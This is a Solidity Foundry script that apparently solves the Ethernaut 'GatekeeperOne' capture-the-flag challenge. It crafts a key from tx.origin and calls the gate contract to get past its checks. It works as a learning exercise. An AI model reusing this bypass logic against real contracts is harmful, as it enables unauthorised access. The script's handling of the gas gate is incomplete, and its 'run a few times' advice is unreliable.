// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import {Script, console} from "forge-std/Script.sol";

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {
    
    function attack(address target) external {
        bytes8 key = craftKey();
        
        // Try to enter - might need to call a few times for gate 2
        IGatekeeperOne(target).enter(key);
    }
    
    function craftKey() public view returns (bytes8) {
        uint16 addressLast16 = uint16(uint160(tx.origin));
        uint64 key64 = uint64(addressLast16);  // bits 0-15 wallet addres, bits 16-31: already zero
        key64 = key64 | (uint64(0x1) << 32);   // bits 32-63 -> set bit 32 to 1

        return bytes8(key64);
    }
    function viewKey() external view returns (bytes8) {
        return craftKey();
    }
}

contract GatekeeperOneSolution is Script {
    function run() external
    {
        address instance = 0x00;

        vm.startBroadcast();
        GatekeeperOneAttack attacker = new GatekeeperOneAttack();

        bytes8 key = attacker.viewKey();
        console.log("key:");
        console.logBytes8(key);
        
        // might need to run a few times for gate 2 gas condition
        attacker.attack(instance);
        vm.stopBroadcast();
    }
}
